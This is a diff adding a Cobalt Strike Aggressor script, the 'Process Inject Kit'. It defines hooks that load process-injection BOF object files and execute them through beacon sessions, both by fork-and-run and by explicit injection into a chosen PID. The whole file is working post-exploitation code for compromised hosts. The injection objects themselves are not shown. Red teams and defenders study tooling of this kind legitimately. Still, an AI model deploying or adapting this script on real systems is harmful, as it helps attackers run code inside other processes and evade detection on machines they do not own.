@@ -1,0 +1,127 @@
+################################################
+## Process Inject Kit
+
+# 辅助函数定义
+sub print_info {
+    println("[*] " . $1);
+}
+
+sub print_good {
+    println("[+] " . $1);
+}
+
+sub print_error {
+    println("[-] " . $1);
+}
+
+sub getFileProper {
+    local('$base $file');
+    $base = $1;
+    $file = $2;
+    if ($base eq "") {
+        return $file;
+    }
+    return $base . "/" . $file;
+}
+
+print_info("Process Inject Kit Loaded");
+$process_inject_kit_path = iff($process_inject_kit_path eq "", script_resource(""), $process_inject_kit_path);
+
+# PROCESS_INJECT_SPAWN HOOK
+#
+# Hook to allow the user to define how the fork and run process injection
+# technique is implemented when executing post exploitation commands.
+#
+# Arguments
+#  $1 = Beacon ID
+#  $2 = memory injectable dll (position-independent code)
+#  $3 = true/false ignore process token
+#  $4 = x86/x64 - memory injectable DLL arch
+#
+# Return
+#  $null    - Use default fork and run process injection technique
+#  non-null - Use fork and run process injection technique from BOF
+#
+set PROCESS_INJECT_SPAWN {
+
+   print_info("Process Inject - PROCESS_INJECT_SPAWN hook");
+
+   local('$barch $handle $data $args $entry');
+ 
+   # Set the architecture for the beacon's session
+   $barch = barch($1);
+ 
+   # read in the injection BOF based on barch
+
+   $pi_object = getFileProper($process_inject_kit_path, "process_inject_spawn $+ . $+ $barch $+ .o");
+
+   $handle = openf($pi_object);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   print_info("Process Inject - " . $pi_object);
+   print_info("Process Inject - Length " . strlen($data));
+
+   # pack our arguments needed for the BOF
+   $args = bof_pack($1, "sb", $3, $2);
+ 
+   btask($1, "Process Inject using fork and run.");
+ 
+   # Set the entry point based on the dll's arch
+   $entry = "go $+ $4";
+   beacon_inline_execute($1, $data, $entry, $args);
+ 
+   # Let the caller know the hook was implemented.
+   return 1;
+}
+
+# PROCESS_INJECT_EXPLICIT HOOK
+#
+# Hook to allow the user to define how the explicit injection technique
+# is implemented when executing post exploitation commands.
+#
+# Arguments
+#  $1 = Beacon ID
+#  $2 = memory injectable dll for the post exploitation command
+#  $3 = the PID to inject into
+#  $4 = offset to jump to
+#  $5 = x86/x64 - memory injectable DLL arch
+#
+# Return
+#  $null    - Use default explicit injection technique
+#  non-null - Use explicit injection technique from BOF
+#
+set PROCESS_INJECT_EXPLICIT {
+
+   print_info("Process Inject - PROCESS_INJECT_EXPLICIT hook");
+
+   local('$barch $handle $data $args $entry');
+ 
+   # Set the architecture for the beacon's session
+   $barch = barch($1);
+ 
+   # read in the injection BOF based on barch
+
+   $pi_object = getFileProper($process_inject_kit_path, "process_inject_explicit $+ . $+ $barch $+ .o");
+
+   $handle = openf($pi_object);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   print_info("Process Inject - " . $pi_object);
+   print_info("Process Inject - Length " . strlen($data));
+   print_info("Process Inject - Target PID " . $3);
+ 
+   # pack our arguments needed for the BOF
+   $args = bof_pack($1, "iib", $3, $4, $2);
+ 
+   btask($1, "Process Inject using explicit injection into pid $3");
+ 
+   # Set the entry point based on the dll's arch
+   $entry = "go $+ $5";
+   beacon_inline_execute($1, $data, $entry, $args);
+ 
+   # Let the caller know the hook was implemented.
+   return 1;
+}
+
